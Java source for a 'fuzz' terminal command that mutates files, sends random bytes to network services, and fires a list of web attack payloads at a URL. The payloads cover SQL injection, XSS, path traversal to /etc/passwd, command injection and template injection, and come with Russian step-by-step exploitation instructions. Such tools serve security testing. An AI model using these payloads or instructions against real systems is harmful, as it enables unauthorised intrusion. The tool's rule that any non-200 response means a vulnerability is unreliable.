package com.terminal.commands;

import java.awt.Color;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyledDocument;

import com.terminal.utils.OutputFormatter;

public class FuzzCommand extends AbstractCommand {
    private static final int BUFFER_SIZE = 1024;
    private static final int MAX_MUTATIONS = 100;
    private static final List<String> WEB_PAYLOADS = Arrays.asList(
        "' OR '1'='1", "<script>alert(1)</script>", "../../../etc/passwd",
        "$(cat /etc/passwd)", "{{7*7}}", "${7*7}", "' UNION SELECT NULL--",
        "%00", "%0d%0a", "../../../../../../../../etc/passwd"
    );

    private static final String[][] PAYLOAD_DESCRIPTIONS = {
        {"' OR '1'='1", "SQL-инъекция для обхода аутентификации:\n│  1. Найдите форму входа\n│  2. Введите любой логин\n│  3. В поле пароля введите: ' OR '1'='1"},
        {"<script>alert(1)</script>", "XSS-уязвимость для внедрения JavaScript:\n│  1. Найдите поле ввода, которое отображается на странице\n│  2. Попробуйте ввести: <script>alert('XSS')</script>"},
        {"../../../etc/passwd", "Path Traversal для чтения системных файлов:\n│  1. Найдите параметр, который загружает файлы\n│  2. Попробуйте использовать относительные пути"},
        {"$(cat /etc/passwd)", "Command Injection для выполнения команд:\n│  1. Найдите поле, где возможен ввод команд\n│  2. Используйте конструкции: $(command) или `command`"},
        {"{{7*7}}", "Template Injection для SSTI атак:\n│  1. Найдите поле, где данные отображаются в шаблоне\n│  2. Попробуйте математические выражения: {{7*7}}"},
        {"${7*7}", "Expression Language Injection:\n│  1. Ищите Java-приложения\n│  2. Используйте выражения: ${7*7} или ${system('ls')}"},
        {"' UNION SELECT NULL--", "SQL-инъекция для извлечения данных:\n│  1. Найдите параметр, где данные берутся из БД\n│  2. Используйте UNION SELECT для получения данных"},
        {"%00", "Null Byte Injection для обхода проверок:\n│  1. Добавьте %00 в конец пути к файлу\n│  2. Используйте в параметрах загрузки файлов"},
        {"%0d%0a", "CRLF Injection для манипуляции заголовками:\n│  1. Найдите поля, значения которых отражаются в заголовках\n│  2. Добавьте %0d%0a перед новыми заголовками"},
        {"../../../../../../../../etc/passwd", "Deep Path Traversal:\n│  1. Используйте в параметрах загрузки файлов\n│  2. Попробуйте разные уровни вложенности ../"}
    };

    public FuzzCommand(StyledDocument doc, Style style) {
        super(doc, style);
    }

    @Override
    protected void initializeSubCommands() {
        addSubCommand("file", "фаззинг файла");
        addSubCommand("web", "фаззинг веб-параметров");
        addSubCommand("net", "фаззинг сетевого протокола");
    }

    @Override
    public void execute(String... args) {
        try {
            if (args.length < 2) {
                OutputFormatter.printBoxedHeader(doc, style, "Использование: fuzz <тип> <цель> [опции]");
                OutputFormatter.printBoxedLine(doc, style, "Типы:");
                OutputFormatter.printBoxedLine(doc, style, "  file <файл>           фаззинг файла");
                OutputFormatter.printBoxedLine(doc, style, "  web <url>             фаззинг веб-параметров");
                OutputFormatter.printBoxedLine(doc, style, "  net <хост> <порт>     фаззинг сетевого протокола");
                OutputFormatter.printBoxedLine(doc, style, "");
                OutputFormatter.printBoxedLine(doc, style, "Примеры:");
                OutputFormatter.printBoxedLine(doc, style, "  fuzz file test.txt    фаззинг файла test.txt");
                OutputFormatter.printBoxedLine(doc, style, "                        создаст 100 мутаций файла");
                OutputFormatter.printBoxedLine(doc, style, "");
                OutputFormatter.printBoxedLine(doc, style, "  fuzz web http://example.com");
                OutputFormatter.printBoxedLine(doc, style, "                        тестирование веб-приложения");
                OutputFormatter.printBoxedLine(doc, style, "                        на наличие уязвимостей");
                OutputFormatter.printBoxedLine(doc, style, "");
                OutputFormatter.printBoxedLine(doc, style, "  fuzz net 192.168.1.1 80");
                OutputFormatter.printBoxedLine(doc, style, "                        фаззинг сетевого сервиса");
                OutputFormatter.printBoxedLine(doc, style, "                        на порту 80");
                OutputFormatter.printBoxedFooter(doc, style);
                return;
            }

            String type = args[0].toLowerCase();
            String target = args[1];

            switch (type) {
                case "file":
                    fuzzFile(target);
                    break;
                case "web":
                    fuzzWeb(target);
                    break;
                case "net":
                    if (args.length < 3) {
                        OutputFormatter.printError(doc, style, "Требуется указать порт");
                        return;
                    }
                    fuzzNetwork(target, Integer.parseInt(args[2]));
                    break;
                default:
                    OutputFormatter.printError(doc, style, "Неизвестный тип фаззинга");
            }
        } catch (Exception e) {
            try {
                OutputFormatter.printError(doc, style, e.getMessage());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    private void fuzzFile(String fileName) throws Exception {
        OutputFormatter.printBoxedHeader(doc, style, "Фаззинг файла");
        OutputFormatter.printBoxedLine(doc, style, "Файл: " + fileName);
        OutputFormatter.printBoxedLine(doc, style, "");

        File file = new File(fileName);
        if (!file.exists()) {
            OutputFormatter.printError(doc, style, "Файл не найден");
            return;
        }

        byte[] original = new byte[BUFFER_SIZE];
        try (FileInputStream fis = new FileInputStream(file)) {
            fis.read(original);
        }

        OutputFormatter.printBoxedLine(doc, style, "Начало фаззинга файла...");
        Random random = new Random();

        for (int i = 0; i < MAX_MUTATIONS; i++) {
            byte[] mutated = original.clone();
            int numMutations = random.nextInt(10) + 1;
            
            for (int j = 0; j < numMutations; j++) {
                int pos = random.nextInt(mutated.length);
                mutated[pos] = (byte) random.nextInt(256);
            }

            String mutatedFile = fileName + ".fuzz" + i;
            try (FileOutputStream fos = new FileOutputStream(mutatedFile)) {
                fos.write(mutated);
            }
            OutputFormatter.printBoxedLine(doc, style, "Создан мутированный файл: " + mutatedFile);
        }

        OutputFormatter.printBoxedFooter(doc, style);
    }

    private void fuzzWeb(String url) throws Exception {
        OutputFormatter.printBoxedHeader(doc, style, "Фаззинг веб-приложения");
        OutputFormatter.printBoxedLine(doc, style, "URL: " + url);
        OutputFormatter.printBoxedLine(doc, style, "");
        OutputFormatter.printBoxedLine(doc, style, "Начало фаззинга веб-приложения...");

        URL baseUrl = new URL(url);

        Style vulnStyle = doc.addStyle("vulnerable", style);
        StyleConstants.setForeground(vulnStyle, new Color(255, 69, 0));
        StyleConstants.setBold(vulnStyle, true);

        for (String payload : WEB_PAYLOADS) {
            String testUrl = baseUrl.toString();
            if (testUrl.contains("?")) {
                testUrl += "&fuzz=" + URLEncoder.encode(payload, "UTF-8");
            } else {
                testUrl += "?fuzz=" + URLEncoder.encode(payload, "UTF-8");
            }

            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(testUrl).openConnection();
                conn.setRequestMethod("GET");
                int responseCode = conn.getResponseCode();
                
                OutputFormatter.printBoxedLine(doc, style, String.format("Тест: %s", payload));
                OutputFormatter.printBoxedLine(doc, style, String.format("Код ответа: %d", responseCode));
                
                if (responseCode != 200) {
                    OutputFormatter.printBoxedLine(doc, vulnStyle, "! Найдена потенциальная уязвимость !");
                    
                    for (String[] description : PAYLOAD_DESCRIPTIONS) {
                        if (description[0].equals(payload)) {
                            OutputFormatter.printBoxedHeader(doc, vulnStyle, "Инструкция по использованию");
                            for (String line : description[1].split("\n")) {
                                OutputFormatter.printBoxedLine(doc, vulnStyle, line);
                            }
                            OutputFormatter.printBoxedFooter(doc, vulnStyle);
                            break;
                        }
                    }
                }
                OutputFormatter.printBoxedLine(doc, style, "");
            } catch (Exception e) {
                OutputFormatter.printError(doc, style, "Ошибка при тестировании " + payload + ": " + e.getMessage());
            }
        }

        OutputFormatter.printBoxedFooter(doc, style);
    }

    private void fuzzNetwork(String host, int port) throws Exception {
        OutputFormatter.printBoxedHeader(doc, style, "Фаззинг сетевого протокола");
        OutputFormatter.printBoxedLine(doc, style, "Хост: " + host);
        OutputFormatter.printBoxedLine(doc, style, "Порт: " + port);
        OutputFormatter.printBoxedLine(doc, style, "");
        OutputFormatter.printBoxedLine(doc, style, "Начало фаззинга сетевого протокола...");

        Random random = new Random();

        for (int i = 0; i < MAX_MUTATIONS; i++) {
            try (Socket socket = new Socket(host, port)) {
                socket.setSoTimeout(1000);
                OutputStream out = socket.getOutputStream();
                
                byte[] data = new byte[random.nextInt(BUFFER_SIZE)];
                random.nextBytes(data);
                
                out.write(data);
                out.flush();

                try {
                    InputStream in = socket.getInputStream();
                    byte[] response = new byte[BUFFER_SIZE];
                    int bytesRead = in.read(response);
                    
                    if (bytesRead > 0) {
                        OutputFormatter.printBoxedLine(doc, style, 
                            String.format("Тест %d: Получен ответ длиной %d байт", i + 1, bytesRead));
                    }
                } catch (Exception e) {
                    OutputFormatter.printBoxedLine(doc, style, 
                        String.format("Тест %d: Ошибка чтения ответа", i + 1));
                }
            } catch (Exception e) {
                OutputFormatter.printBoxedLine(doc, style, 
                    String.format("Тест %d: Ошибка соединения - %s", i + 1, e.getMessage()));
            }
        }

        OutputFormatter.printBoxedFooter(doc, style);
    }

    @Override
    public String getDescription() {
        return "инструменты для фаззинга";
    }
} 